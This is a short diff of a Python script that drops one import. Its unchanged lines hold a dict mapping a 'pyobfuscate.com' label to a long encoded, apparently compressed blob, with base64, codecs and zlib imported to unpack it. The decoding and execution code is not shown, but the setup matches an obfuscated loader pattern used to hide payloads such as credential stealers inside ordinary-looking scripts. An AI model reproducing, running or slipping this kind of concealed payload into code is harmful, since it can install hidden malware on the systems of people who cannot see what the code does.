@@ -1,4 +1,4 @@
-import os, requests, random, threading, json, time, multiprocessing, subprocess
+import os, random, threading, json, time, multiprocessing, subprocess
 from colorama import Fore
 import base64,codecs,zlib;pyobfuscate=""
 obfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(import json)'],['''@ZMz6KMKA{-VpPgl{bWLXEzXpu%8n)o}tk~pVI-Wv#+LI7#Su)X1iIJh}PY<d<MgSWaws_e6G+U7l7;sDh>9JqWzloLBf5@;f0Zqh}a@gr+vbJ$C5cPjt3d58Bco@vqnT;c4_~nwPi_%hwf^L{%@L@K3g{!5MM0!@`0!FOS<&l7W-M-siQ2in$r`9PiYYW!$&d+DL+76#?0t<wc8D{rm_+X)dMu-OM(jM5iZg;%pYzCDEduWat>EKsdunD8eX;$kGvHTq_NDcfy*-P{P2kgCa@q$wVf^z1K;YykKEkhl_g$<sOPo-+4-4kVA7lB#Bg(S&7lr@&at0yn_ew>DV+Vsl*70|EFVGv88nXyGJZLea`TS0lTS>_KPn}wO5w4XPSHQsCu_c_lISI*3`a`yko;40Bd;zwq&~fyPNpbLS%{UBL$5TeYM@Hrx@4EvL@|n`DkZr5)Eqh47<~Egw3z)zGM!jRMB5F+ZWMR!ADUrT^mQ#*1mnQVqI~g5kWehBBtFtX%D7iTW8>O6V&E#GNrlHua)-x1CPd;LY2#QHk#!HnkmXz6s?azj3Zjm6fLOGzsqk|X5w0n^4ELz&uSTdtHy4(zq^#{tYt;WRz#~BSl0D9uJ8|}4F)h-(=eJ)=&RFS%DM~T5QPG{(JcSb;0cPRHB-{pGn4^q_gp`DMa_84+FtPxFI>STnpeLMUnZ)=RZ=L3mISyv5eRPt5-$n'''.replace('\n','')]))
